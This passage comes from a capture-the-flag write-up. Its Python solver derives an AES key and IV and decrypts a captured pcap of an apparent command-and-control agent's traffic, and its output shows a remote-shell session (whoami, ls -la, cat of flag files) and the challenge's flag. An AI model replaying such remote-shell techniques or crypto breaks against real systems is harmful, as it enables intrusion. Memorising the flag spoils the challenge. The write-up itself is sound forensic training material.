    return h[4:36]  # 32 bytes for AES-256


def shift(data: bytes) -> bytes:
    """
    Same 'shift' as in Agent:
    - Process data in 8-byte blocks, reversing each block
    - Reverse the remaining tail as well
    """
    out = b""
    full_blocks = len(data) // 8

    for i in range(full_blocks):
        block = data[i * 8 : (i + 1) * 8]
        out += block[::-1]

    tail_start = full_blocks * 8
    tail = data[tail_start:]
    out += tail[::-1]

    return out


def unpad(data: bytes) -> bytes:
    # PKCS#7 unpadding, same as Agent.unpad
    if not data:
        raise ValueError("Cannot unpad empty data")
    pad_len = data[-1]
    if pad_len == 0 or pad_len > AES.block_size:
        raise ValueError("Invalid padding length")
    return data[:-pad_len]


def decrypt_payload(payload: bytes, key: bytes, iv: bytes) -> bytes:
    """
    Mirror Agent.decrypt:
        decrypted_data = aes.decrypt(shift(data))
        return unpad(decrypted_data)
    """
    aes = AES.new(key, AES.MODE_CBC, iv)
    decrypted = aes.decrypt(shift(payload))
    return unpad(decrypted)


def derive_iv_from_banner(payload: bytes, key: bytes) -> bytes:
    """
    We know:
        C1 = AES_Enc_K(P1 XOR IV)
        AES_Dec_K(C1) = P1 XOR IV
        IV = AES_Dec_K(C1) XOR P1

    We don't see C1 directly: the agent sends shift(ciphertext).
    So:
        ciphertext = aes.encrypt(...)
        sent = shift(ciphertext)
        C1 = shift(sent)[:16]
    """
    # Undo shift on the whole payload, then take first block
    ct = shift(payload)
    c1 = ct[:16]

    # Decrypt first block in ECB mode (single-block AES)
    aes_ecb = AES.new(key, AES.MODE_ECB)
    block = aes_ecb.decrypt(c1)  # this is P1 XOR IV

    if len(KNOWN_PLAIN_BLOCK) != 16:
        raise ValueError("KNOWN_PLAIN_BLOCK must be 16 bytes")

    iv = bytes(b ^ p for b, p in zip(block, KNOWN_PLAIN_BLOCK))
    return iv


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <capture.pcap>")
        sys.exit(1)

    pcap_file = sys.argv[1]
    key = derive_key(KEY_STR)
    iv = None

    packets = rdpcap(pcap_file)

    pkt_count = 0
    dec_ok = 0

    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            tcp = pkt[TCP]
            if tcp.sport == PORT or tcp.dport == PORT:
                payload = bytes(tcp[Raw].load)
                if not payload:
                    continue

                # Derive IV from the first banner packet (assumed first payload to port 2025)
                if iv is None and tcp.dport == PORT:
                    try:
                        iv = derive_iv_from_banner(payload, key)
                        print(f"[+] Derived IV: {iv.hex()}")
                    except Exception as e:
                        print(f"[!] Failed to derive IV from this packet: {e}")

                if iv is None:
                    # We haven't found a suitable packet yet
                    continue

                pkt_count += 1
                src = pkt[IP].src
                dst = pkt[IP].dst
                print(f"\n--- Packet #{pkt_count} {src}:{tcp.sport} -> {dst}:{tcp.dport} ---")
                try:
                    plaintext = decrypt_payload(payload, key, iv)
                    dec_ok += 1
                    try:
                        text = plaintext.decode("utf-8")
                        print("Decrypted text:")
                        print(text)
                    except UnicodeDecodeError:
                        print("Decrypted bytes (non-UTF-8):")
                        print(plaintext.hex())
                except Exception as e:
                    print(f"[!] Decryption failed: {e}")
                    print("Raw payload (hex):")
                    print(payload.hex())

    print(f"\n[+] Processed {pkt_count} packets on port {PORT}, "
          f"successfully decrypted {dec_ok} of them")


if __name__ == "__main__":
    main()

```

Output:

```console
──(py_ctf_env)─(user@kali3)-[/media/sf_CTFs/bsides/Avengers_Disassemble]
└─$ python3 solve.py Avengers_Disassemble.pcap
[+] Derived IV: 405b35dad8bda1e49bd0b0c9aeb0490d

--- Packet #1 172.29.102.84:59614 -> 172.29.96.1:2025 ---
Decrypted text:
  _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
 |_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|
                               | | ___ | | _____ _ __  / ||___  | ___|
                            _  | |/ _ \| |/ / _ \ '__| | |   / /|___ \
                           | |_| | (_) |   <  __/ |    | |_ / /  ___) |
  _         _   _           \___/ \___/|_|\_\___|_|    |_(_)_(_)|____/                   _   _           _      __                _
 | |    ___| |_( )___   _ __  _   _| |_    __ _   ___ _ __ ___ (_) | ___    ___  _ __   | |_| |__   __ _| |_   / _| __ _  ___ ___| |
 | |   / _ \ __|// __| | '_ \| | | | __|  / _` | / __| '_ ` _ \| | |/ _ \  / _ \| '_ \  | __| '_ \ / _` | __| | |_ / _` |/ __/ _ \ |
 | |__|  __/ |_  \__ \ | |_) | |_| | |_  | (_| | \__ \ | | | | | | |  __/ | (_) | | | | | |_| | | | (_| | |_  |  _| (_| | (_|  __/_|
 |_____\___|\__| |___/ | .__/ \__,_|\__|  \__,_| |___/_| |_| |_|_|_|\___|  \___/|_| |_|  \__|_| |_|\__,_|\__| |_|  \__,_|\___\___(_)
  _____ _____ _____ ___|_|_____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
 |_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|
Computer Name: DESKTOP-A00LDHL
OS Name: Linux
Local IP Address: 127.0.1.1


--- Packet #2 172.29.96.1:2025 -> 172.29.102.84:59614 ---
Decrypted text:
Q3u~")!@Padtz_2rwhoami

--- Packet #3 172.29.102.84:59614 -> 172.29.96.1:2025 ---
Decrypted text:
oam


--- Packet #4 172.29.96.1:2025 -> 172.29.102.84:59614 ---
Decrypted text:
Q3u~")!@Padtz_2rls -la

--- Packet #5 172.29.102.84:59614 -> 172.29.96.1:2025 ---
Decrypted text:
total 32
drwxr-xr-x  2 oam  oam  4096 Mar 14 16:07 .
drwxrwxrwt 16 root root 4096 Mar 14 15:54 ..
-rw-r--r--  1 oam  oam  7889 Mar 14 15:46 FortiEDR.py
-rw-r--r--  1 oam  oam    17 Mar 14 15:59 flag1.txt
-rw-r--r--  1 oam  oam    25 Mar 14 15:59 flag2.txt
-rw-r--r--  1 oam  oam    32 Mar 14 15:54 iv
-rw-r--r--  1 oam  oam  1554 Mar 14 16:02 who_is_spiderman.id


--- Packet #6 172.29.96.1:2025 -> 172.29.102.84:59614 ---
Decrypted text:
bf)C._r]V4[+ZF2cwho_is_spiderman.id

--- Packet #7 172.29.102.84:59614 -> 172.29.96.1:2025 ---
Decrypted text:
The Identity of Spider-Man: A Complex Hero

Spider-Man, one of the most beloved superheroes in the Marvel Universe, has a rich and multifaceted identity that resonates with fans worldwide. Created by writer Stan Lee and artist Steve Ditko, Spider-Man first appeared in Amazing Fantasy #15 in 1962. But behind the mask of Spider-Man lies a character who is as complex and human as any of us.

At his core, Spider-Man is Peter Parker, an ordinary young man struggling with the typical challenges of life—family, friends, school, work, and the looming expectations of adulthood. His journey as Spider-Man began when he was bitten by a radioactive spider, gaining superhuman abilities. These included enhanced strength, agility, a "spider-sense" that alerts him to danger, and the ability to cling to walls.

While these abilities might have made him an ideal candidate for a superhero, it was Peter's moral compass and his deep sense of responsibility that defined his identity. The famous phrase "With great power comes great responsibility" has become synonymous with Spider-Man, encapsulating the personal burden Peter feels to use his abilities for good. This is an essential part of his identity—Peter doesn’t fight crime out of a desire for fame or fortune, but out of the guilt and responsibility stemming from his uncle Ben’s death. This tragedy, where Peter failed to act and prevent the crime that led to Uncle Ben's death, leaves an indelible mark on his psyche, driving his dedication to protecting others, often at great personal cost.


--- Packet #8 172.29.96.1:2025 -> 172.29.102.84:59614 ---
Decrypted text:
Q3u~")!@Padtz_2rcat flag1.txt

--- Packet #9 172.29.102.84:59614 -> 172.29.96.1:2025 ---
Decrypted text:
BSidesTLV2025{1_


--- Packet #10 172.29.96.1:2025 -> 172.29.102.84:59614 ---
Decrypted text:
bf)C._r]V4[+ZF2cflag2.txt

--- Packet #11 172.29.102.84:59614 -> 172.29.96.1:2025 ---
Decrypted text:
l0v3_3xpl0r1ng_byt3c0d3}


--- Packet #12 172.29.96.1:2025 -> 172.29.102.84:59614 ---
Decrypted text:
hAm$6C]5qQGnpX<4

[+] Processed 12 packets on port 2025, successfully decrypted 12 of them
```

The flag: `BSidesTLV2025{1_l0v3_3xpl0r1ng_byt3c0d3}`